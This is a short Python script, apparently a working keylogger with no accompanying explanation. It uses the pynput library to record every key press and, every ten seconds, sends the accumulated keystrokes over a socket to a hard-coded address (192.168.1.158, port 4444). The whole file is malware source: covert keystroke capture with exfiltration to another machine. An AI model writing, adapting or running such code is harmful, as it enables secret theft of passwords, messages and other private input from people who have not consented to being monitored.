import pynput.keyboard 
import threading
import socket

class Keylogger:

	def __init__(self, time_interval):
		self.s = socket.socket()
		self.target_ip = "192.168.1.158"
		self.port = 4444
		self.s.connect((self.target_ip, self.port))
		self.log = "Keylogger started\n"
		self.time_interval = time_interval

	def append_to_log(self, string):
		self.log = self.log + string

	def process_key_press(self, key):
		try:
			current_key = str(key.char)
		except AttributeError:
			if key == key.space:
				current_key = " "
			else:
				current_key = " " + str(key) + " "
		self.append_to_log(current_key)

	def report(self):
		global log
		print(self.log)
		self.s.send(self.log.encode())
		self.log = ""
		timer = threading.Timer(self.time_interval, self.report)
		timer.start()

	def start(self):
		keyboard_listener = pynput.keyboard.Listener(on_press=self.process_key_press)
		with keyboard_listener:
			self.report()
			keyboard_listener.join() 





my_keylogger = Keylogger(10)
my_keylogger.start()